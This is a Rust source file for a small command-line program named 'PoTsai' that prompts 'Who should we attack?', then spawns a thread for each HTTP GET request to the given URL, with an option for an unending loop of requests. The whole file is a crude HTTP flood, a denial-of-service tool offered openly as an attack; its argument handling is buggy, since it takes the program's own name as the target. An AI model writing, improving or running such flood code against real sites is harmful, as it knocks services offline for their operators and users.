extern crate futures;
extern crate hyper;
extern crate tokio_core;

use futures::{Future};
use hyper::{Client, Uri};
use tokio_core::reactor::Core;
use std::io;
use std::io::Write;
use std::thread;
use std::env;

fn read() -> String {
  let mut inp = String::new();
  io::stdin().read_line(&mut inp).expect("Failed to read line...");
  let mut inp: &str = inp.as_ref();
  inp = inp.trim();
  let inp: String = inp.to_string();
  return inp;
}

fn readi() -> i32 {
  let mut inp = String::new();
  io::stdin().read_line(&mut inp).expect("Failed to read line...");
  let mut inp: &str = inp.as_ref();
  inp = inp.trim();
  let inp: String = inp.to_string();
  let inp: i32 = match inp.parse() {
    Ok(num) => num,
    Err(_) => {
      println!("Please enter a number!");
      0
    }
  };
  return inp;
}

fn print_n(s: &str) {
  print!("{}", s);
  io::stdout().flush().unwrap();
}

fn new_thread(url: String, t: i64) {
    let name = format!("child{}", t);
    println!("CREATING NEW THREAD ON {}", name);
    match thread::Builder::new().name(name.to_string()).spawn(move || {
        // Core is the Tokio event loop used for making a non-blocking request
        let mut core = Core::new().unwrap();

        let client = Client::new(&core.handle());

        let uri : Uri = url.parse().unwrap();

        let request = client.get(uri)
            .map(|res| {
                assert_eq!(res.status(), hyper::Ok);
            });

        // request is a Future, futures are lazy, so must explicitly run
        core.run(request).expect("\n\nSomething went wrong with `core.run`\n\n");
    }) {
      Ok(_) => println!("Thread {} exited successfully", name),
      Err(_) => println!("Thread {} died. Great.", name),
    }
}

fn main() {
  let args: Vec<_> = env::args().collect();
  println!("Welcome to PoTsai!");
  let mut uri: String;
  if args.len() < 2 {
    print_n("Who should we attack? :");
    uri = read();
  } else {
    uri = args[0].clone();
  }
  print_n("How many requests should be made? (type -1 for infinte) :");
  let amnt = readi();
  if amnt == -1 {
    let mut times: i64 = 0;
    loop {
      times += 1;
      let new = uri.clone();
      new_thread(new, times);
    }
  }

  for i in 0..amnt {
      let new = uri.clone();
      new_thread(new, i.into());
  }
}
